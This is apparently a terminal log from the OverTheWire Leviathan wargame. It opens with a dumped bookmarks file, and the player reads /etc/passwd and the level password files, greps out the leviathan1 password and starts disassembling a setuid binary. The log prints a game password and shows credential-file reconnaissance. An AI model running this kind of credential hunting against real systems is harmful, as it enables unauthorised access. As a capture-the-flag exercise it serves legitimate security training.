<DT><A HREF="http://thankmeforthemusic.blogspot.com/" ADD_DATE="1112574986" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Thank Me For the Music</A>
<DT><A HREF="http://www.thereminvox.com/tvoxlib/27" ADD_DATE="1132715686" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Theremin Vox</A>
<DT><A HREF="http://tofuhut.blogspot.com/" ADD_DATE="1122081653" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Tofu Hut</A>
<DT><A HREF="http://www.ubu.com/" ADD_DATE="1156613916" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">UBU Web</A>
<DT><A HREF="http://www.wavsource.com/" ADD_DATE="1141390373" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Wav Source</A>
<DT><A HREF="http://blog.wfmu.org/freeform/" ADD_DATE="1117622406" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">WFMU's Beware of the Blog</A>
<DT><A HREF="http://www.youtube.com/" ADD_DATE="1139341829" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">YouTube</A>

<DT><A HREF="http://rockcriticslinks.blogspot.com/2006/05/sounds-visions.html" ADD_DATE="1122348556" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">scott&nbsp;&nbsp;# 10:51 PM</A>
<DT><A HREF="http://www.blogger.com/post-edit.g?blogID=20555422&amp;postID=114818413392068418&amp;quickEdit=true" ADD_DATE="1145003276" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"><span class="quick-edit-icon">&nbsp;</span></A>
<DT><A HREF="http://hem.bredband.net/b132682/" ADD_DATE="1134368471" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Acclaimed Music</A>
<DT><A HREF="http://www.allmusic.com" ADD_DATE="1106414334" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">All Music Guide</A>
<DT><A HREF="http://www.allmusicsite.tk/" ADD_DATE="1154429222" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">All Music Site</A>
<DT><A HREF="http://www.arthurmag.com" ADD_DATE="1145021981" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Arthur</A>
<DT><A HREF="http://bangsheet.com/" ADD_DATE="1105714943" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">bangSheet</A>
<DT><A HREF="http://www.billboard.com" ADD_DATE="1159397067" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Billboard</A>
<DT><A HREF="http://www.blastitude.com/" ADD_DATE="1100237045" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Blastitude</A>

<DT><A HREF="http://www.blender.com/index.html" ADD_DATE="1152249382" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Blender</A>
<DT><A HREF="http://bomp.com/" ADD_DATE="1107779218" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Bomp!</A>
<DT><A HREF="http://popmatters.com/chapter/04Autumn/index.html" ADD_DATE="1105356347" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Chapter & Verse</A>
<DT><A HREF="http://www.classicrockrevisited.com/" ADD_DATE="1103392337" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Classic Rock Revisited</A>
<DT><A HREF="http://www.cowsound.org/" ADD_DATE="1107934653" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Cow Sound</A>
<DT><A HREF="http://www.cdaddy.com/FormatHomePage.cgi" ADD_DATE="1155060099" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Crawdaddy!</A>
<DT><A HREF="http://creemmedia.com/" ADD_DATE="1112466951" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Creem Magazine</A>
<DT><A HREF="http://www.crushermagazine.com/start.htm" ADD_DATE="1123617507" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Crusher</A>

<DT><A HREF="http://www.djmag.com/" ADD_DATE="1136281550" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">DJ Mag</A>
<DT><A HREF="http://www.drownedinsound.com/" ADD_DATE="1113711854" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Drowned in Sound</A>
<DT><A HREF="http://www.exclaim.ca/index.asp" ADD_DATE="1118752996" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Exclaim!</A>
<DT><A HREF="http://www.readexiled.com/" ADD_DATE="1120180097" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Exiled on Main Street</A>
<DT><A HREF="http://emplive.com/" ADD_DATE="1103662979" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Experience Music Project</A>
<DT><A HREF="http://www.fastnbulbous.com/" ADD_DATE="1151225792" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Fast 'n Bulbous</A>
<DT><A HREF="http://www.globalpopconspiracy.com/comrades/" ADD_DATE="1126480087" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Global Pop Conspiracy</A>
<DT><A HREF="http://www.gloriousnoise.com/" ADD_DATE="1116186822" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Glorious Noise</A>
<DT><A HREF="http://www.guardian.co.uk/arts/" ADD_DATE="1123690335" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Arts section</A>

<DT><A HREF="http://www.lacitybeat.com/" ADD_DATE="1148510598" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">LA City Beat</A>
<DT><A HREF="http://www.lostcausemag.com/" ADD_DATE="1112549594" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Lost Cause</A>
<DT><A HREF="http://www.metacritic.com/music/" ADD_DATE="1104829564" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">metacritic</A>
<DT><A HREF="http://www.metalkingdom.cl/" ADD_DATE="1105881860" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Metal Kingdom</A>
<DT><A HREF="http://hometown.aol.com/nightfly62/nightfly.html" ADD_DATE="1151840281" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Music History</A>
<DT><A HREF="http://www.musicpressreport.com" ADD_DATE="1127126978" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">the {music} press report</A>
<DT><A HREF="http://neumu.com/" ADD_DATE="1150833994" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Neumu</A>
<DT><A HREF="http://nme.com/" ADD_DATE="1125957609" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">NME</A>
<DT><A HREF="http://www.freakytrigger.co.uk/nylpm/index.html" ADD_DATE="1133490169" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">New York London Paris Munich</A>

<DT><A HREF="http://robertchristgau.com/xg/pnj/index.php" ADD_DATE="1145012072" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Pazz & Jop</A>
<DT><A HREF="http://www.perfectsoundforever.com/" ADD_DATE="1110728446" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Perfect Sound Forever</A>
<DT><A HREF="http://www.pitchforkmedia.com/" ADD_DATE="1139153970" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Pitchfork</A>
<DT><A HREF="http://www.popmatters.com" ADD_DATE="1144157995" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">PopMatters</A>
<DT><A HREF="http://popped.com/" ADD_DATE="1110914348" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Popped</A>
<DT><A HREF="http://popped.com/radioon/98/index.html" ADD_DATE="1131152208" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Radio On</A>
<DT><A HREF="http://www.rockrap.com/" ADD_DATE="1151886070" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Rock and Rap Confidential</A>
<DT><A HREF="http://www.rockcritics.com/topfive/" ADD_DATE="1116219552" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Top 5 Lists</A>

<DT><A HREF="http://www.rocksbackpages.com/index.html" ADD_DATE="1134493403" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Rock's Backpages</A>
<DT><A HREF="http://rollingstone.com/" ADD_DATE="1159769580" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Rolling Stone</A>
<DT><A HREF="http://www.thesource.com/entersite.html" ADD_DATE="1111028507" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Source</A>
<DT><A HREF="http://spin.com/" ADD_DATE="1146909211" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Spin</A>
<DT><A HREF="http://www.stylusmagazine.com/" ADD_DATE="1123135944" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Stylus Magazine</A>
<DT><A HREF="http://www.superseventies.com/" ADD_DATE="1147258915" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Super Seventies Rock Site</A>
<DT><A HREF="http://tangmonkey.com/" ADD_DATE="1100369921" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">TangMonkey.com</A>
<DT><A HREF="http://www.trouserpress.com/" ADD_DATE="1141837797" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Trouser Press</A>
<DT><A HREF="http://urb.com/" ADD_DATE="1107187868" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Urb</A>

<DT><A HREF="http://vibe.com/" ADD_DATE="1103981757" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Vibe</A>
<DT><A HREF="http://xlr8r.com/" ADD_DATE="1132812446" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">XLR8R</A>
<DT><A HREF="http://xxlmag.com/" ADD_DATE="1133616813" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">XXL</A>
<DT><A HREF="http://rockcriticslinks.blogspot.com/2006/05/zines.html" ADD_DATE="1120117437" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">scott&nbsp;&nbsp;# 10:17 PM</A>
<DT><A HREF="http://www.blogger.com/post-edit.g?blogID=20555422&amp;postID=114818426851393693&amp;quickEdit=true" ADD_DATE="1156451639" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"><span class="quick-edit-icon">&nbsp;</span></A>
<DT><A HREF="http://aldaily.com/" ADD_DATE="1121876267" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Arts & Letters Daily</A>
<DT><A HREF="http://www.blogsearchengine.com/entertainment_blogs.html" ADD_DATE="1132615888" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Blog Search Engine</A>
<DT><A HREF="http://bostonphoenix.com/" ADD_DATE="1101030059" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Boston Phoenix</A>

<DT><A HREF="http://chrisbuck.com/" ADD_DATE="1127706984" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Chris Buck</A>
<DT><A HREF="http://citypages.com/" ADD_DATE="1124205026" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">City Pages</A>
<DT><A HREF="http://www.dailyhowler.com/" ADD_DATE="1128105895" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Daily Howler</A>
<DT><A HREF="http://atrios.blogspot.com/" ADD_DATE="1118289835" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Reality-Based Community</A>
<DT><A HREF="http://www.gadflyonline.com/" ADD_DATE="1150111492" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Gadfly Online</A>
<DT><A HREF="http://gawker.com" ADD_DATE="1101344921" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Gawker</A>
<DT><A HREF="http://laweekly.com/" ADD_DATE="1103050763" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">L.A. Weekly</A>
<DT><A HREF="http://whatisthemessage.blogspot.com/" ADD_DATE="1100588795" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">McLuhan-oriented</A>
<DT><A HREF="http://newyorkobserver.com/index_go.html" ADD_DATE="1140447749" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">New York Observer</A>

<DT><A HREF="http://nypress.com/" ADD_DATE="1147157615" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">New York Press</A>
<DT><A HREF="http://newyorker.com/" ADD_DATE="1111452000" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The New Yorker</A>
<DT><A HREF="http://theonion.com/" ADD_DATE="1111348814" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Onion</A>
<DT><A HREF="http://www.paved.ca" ADD_DATE="1138792542" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Paved</A>
<DT><A HREF="http://www.poynter.org/column.asp?id=45" ADD_DATE="1127620409" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Romenesko</A>
<DT><A HREF="http://www.salon.com" ADD_DATE="1145791074" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Salon</A>
<DT><A HREF="http://seattleweekly.com/" ADD_DATE="1138310979" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Seattle Weekly</A>
<DT><A HREF="http://slate.msn.com" ADD_DATE="1138597774" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Slate</A>
<DT><A HREF="http://www.talkingpointsmemo.com/" ADD_DATE="1132449141" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Talking Points Memo</A>

<DT><A HREF="http://www.technorati.com/" ADD_DATE="1101195779" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Technorati</A>
<DT><A HREF="http://www.popfactor.com/tmftml/" ADD_DATE="1125605546" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">TMFTML</A>
<DT><A HREF="http://www.kentucker.net/" ADD_DATE="1132767920" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ken Tucker</A>
<DT><A HREF="http://www.villagevoice.com/" ADD_DATE="1142982434" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Village Voice</A>
<DT><A HREF="http://jameswolcott.com" ADD_DATE="1132742272" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">James Wolcott</A>
<DT><A HREF="http://wonkette.com/" ADD_DATE="1136698535" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Wonkette</A>
<DT><A HREF="http://rockcriticslinks.blogspot.com/2006/05/unclassifiable-at-any-speed.html" ADD_DATE="1115543737" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">scott&nbsp;&nbsp;# 10:02 PM</A>
<DT><A HREF="http://www.blogger.com/post-edit.g?blogID=20555422&amp;postID=114818420723428345&amp;quickEdit=true" ADD_DATE="1106107942" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"><span class="quick-edit-icon">&nbsp;</span></A>
<DT><A HREF="http://www.dissensus.com/" ADD_DATE="1156764829" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Dissensus</A>

<DT><A HREF="http://groups.yahoo.com/group/girlgroup/" ADD_DATE="1111744232" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Girl Group Mailing List</A>
<DT><A HREF="http://ilx.wh3rd.net/newquestions.php?board=2" ADD_DATE="1127933066" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">I Love Music</A>
<DT><A HREF="http://ilx.wh3rd.net/newquestions.php?board=1" ADD_DATE="1129129574" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">I Love Everthing</A>
<DT><A HREF="http://rockcriticslinks.blogspot.com/2006/05/chats.html" ADD_DATE="1112723149" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">scott&nbsp;&nbsp;# 9:50 PM</A>
<DT><A HREF="http://www.blogger.com/post-edit.g?blogID=20555422&amp;postID=114818435509754093&amp;quickEdit=true" ADD_DATE="1155588908" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"><span class="quick-edit-icon">&nbsp;</span></A>
<DT><A HREF="http://www.chictribute.com/index2.html" ADD_DATE="1153283458" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Chic</A>
<DT><A HREF="http://www.drummerworld.com/" ADD_DATE="1140777901" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Drummers</A>
<DT><A HREF="http://www.girl-groups.com/" ADD_DATE="1113627599" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Girl Groups</A>
<DT><A HREF="http://hometown.aol.co.uk/glamrockbear/" ADD_DATE="1143143806" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Glam Rock</A>

<DT><A HREF="http://www.jgeoff.com/godfather/gf1/" ADD_DATE="1142071680" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Godfather</A>
<DT><A HREF="http://guitar-masters.com/Guitars/" ADD_DATE="1116627220" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Guitars</A>
<DT><A HREF="http://www.ktelclassics.com/" ADD_DATE="1143681459" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">K-Tel</A>
<DT><A HREF="http://www.maxskansascity.com/" ADD_DATE="1122268285" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Max's</A>
<DT><A HREF="http://www.planetmellotron.com/" ADD_DATE="1103533691" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mellotrons</A>
<DT><A HREF="http://www.scorsesefilms.com/" ADD_DATE="1155082316" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Martin Scorsese</A>
<DT><A HREF="http://homepage.mac.com/johnhyde/Events184.html" ADD_DATE="1133565956" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Scritti Politti</A>
<DT><A HREF="http://www.theshangri-las.com/Shadow%20Morton%20interview.htm" ADD_DATE="1142275091" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Shadow</A>
<DT><A HREF="http://www.sparks-fanatics.com/" ADD_DATE="1122451582" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sparks</A>

<DT><A HREF="http://www.synthfool.com/pics.html" ADD_DATE="1119105886" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Synthesizers</A>
<DT><A HREF="http://www.msu.edu/user/svoboda1/taxi_driver/" ADD_DATE="1120334926" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Travis</A>
<DT><A HREF="http://www.paramountclassics.com/virginsuicides/html_3/" ADD_DATE="1100798213" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Virgin Suicides</A>
<DT><A HREF="http://www.warholstars.org/" ADD_DATE="1151503884" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Warhol</A>
<DT><A HREF="http://www.x-rayspex.com/" ADD_DATE="1121479563" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">X-Ray Spex</A>


</DL><p>

leviathan0@leviathan:~/.backup$ cd ..
leviathan0@leviathan:~$ cat  /etc/leviathan_pass/leviathan01
cat: /etc/leviathan_pass/leviathan01: No such file or directory
leviathan0@leviathan:~$ cat  /etc/leviathan_pass/leviathan
leviathan0  leviathan1  leviathan2  leviathan3  leviathan4  leviathan5  leviathan6  leviathan7
leviathan0@leviathan:~$ cat  /etc/leviathan_pass/leviathan0
leviathan0
leviathan0@leviathan:~$ cat  /etc/leviathan_pass/leviathan1
cat: /etc/leviathan_pass/leviathan1: Permission denied
leviathan0@leviathan:~$ ls -la  /etc/leviathan_pass/
total 40
drwxr-xr-x   2 root       root       4096 Nov 13 16:03 .
drwxr-xr-x 100 root       root       4096 Dec 16 14:07 ..
-r--------   1 leviathan0 leviathan0   11 Nov 13 16:03 leviathan0
-r--------   1 leviathan1 leviathan1   11 Nov 13 16:03 leviathan1
-r--------   1 leviathan2 leviathan2   11 Nov 13 16:03 leviathan2
-r--------   1 leviathan3 leviathan3   11 Nov 13 16:03 leviathan3
-r--------   1 leviathan4 leviathan4   11 Nov 13 16:03 leviathan4
-r--------   1 leviathan5 leviathan5   11 Nov 13 16:03 leviathan5
-r--------   1 leviathan6 leviathan6   11 Nov 13 16:03 leviathan6
-r--------   1 leviathan7 leviathan7   11 Nov 13 16:03 leviathan7
leviathan0@leviathan:~$
leviathan0@leviathan:~$
leviathan0@leviathan:~$
leviathan0@leviathan:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
puppet:x:111:117:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
identd:x:112:65534::/var/run/identd:/bin/false
ntp:x:113:118::/home/ntp:/bin/false
leviathan0:x:12000:12000:leviathan level 0:/home/leviathan0:/bin/bash
leviathan1:x:12001:12001:leviathan level 1:/home/leviathan1:/bin/bash
leviathan2:x:12002:12002:leviathan level 2:/home/leviathan2:/bin/bash
leviathan3:x:12003:12003:leviathan level 3:/home/leviathan3:/bin/bash
leviathan4:x:12004:12004:leviathan level 4:/home/leviathan4:/bin/bash
leviathan5:x:12005:12005:leviathan level 5:/home/leviathan5:/bin/bash
leviathan6:x:12006:12006:leviathan level 6:/home/leviathan6:/bin/bash
leviathan7:x:12007:12007:leviathan level 7:/home/leviathan7:/bin/bash
leviathan0@leviathan:~$ ls
leviathan0@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 Nov 13 16:03 .
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Nov 13 16:03 .backup
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
leviathan0@leviathan:~$ cd .backup/
leviathan0@leviathan:~/.backup$ ll
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Nov 13 16:03 ./
drwxr-xr-x 3 root       root         4096 Nov 13 16:03 ../
-rw-r----- 1 leviathan1 leviathan0 133259 Nov 13 16:03 bookmarks.html
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep levia
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
leviathan0@leviathan:~/.backup$ exit
logout
Connection to leviathan.labs.overthewire.org closed.
➜  ~ ssh leviathan1@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan1@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan1@leviathan:~$ ll
total 28
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan2 leviathan1 7608 Nov 13 16:03 check*
leviathan1@leviathan:~$ ./check
password: rioGegei8m
Wrong password, Good Bye ...
leviathan1@leviathan:~$ strings check
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
puts
setreuid
__stack_chk_fail
printf
getchar
system
geteuid
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.4
GLIBC_2.0
PTRh
D$,1
D$%secrf
D$)et
D$ love
T$,e3
UWVS
t$,U
[^_]
password:
/bin/sh
Wrong password, Good Bye ...
;*2$"
GCC: (Ubuntu 4.8.5-4ubuntu2) 4.8.5
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6614
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
check.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strcmp@@GLIBC_2.0
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
printf@@GLIBC_2.0
getchar@@GLIBC_2.0
_edata
__stack_chk_fail@@GLIBC_2.4
geteuid@@GLIBC_2.0
__data_start
puts@@GLIBC_2.0
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
setreuid@@GLIBC_2.0
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_fp_hw
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
leviathan1@leviathan:~$ objdump -d -Mintel check

check:     file format elf32-i386


Disassembly of section .init:

080483b8 <_init>:
 80483b8:	53                   	push   ebx
 80483b9:	83 ec 08             	sub    esp,0x8
 80483bc:	e8 ff 00 00 00       	call   80484c0 <__x86.get_pc_thunk.bx>
